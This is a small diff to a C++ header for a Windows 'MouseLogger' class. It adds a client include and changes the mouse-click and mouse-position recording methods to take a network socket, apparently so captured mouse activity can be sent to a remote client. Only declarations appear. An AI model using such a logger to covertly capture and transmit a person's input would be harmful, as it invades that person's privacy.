@@ -4,7 +4,7 @@
 #include <Windows.h>
 #include <iostream>
 #include <thread>
-
+#include "Client.h"
 
 class MouseLogger
 {
@@ -12,9 +12,6 @@ public:
 	MouseLogger();
 	~MouseLogger();
 
-	void RecordMouseClicks();
-	void RecordMousePos();
-
-private:
-
+	void recordMouseClicks(SOCKET sock);
+	void recordMousePos(SOCKET sock);
 };
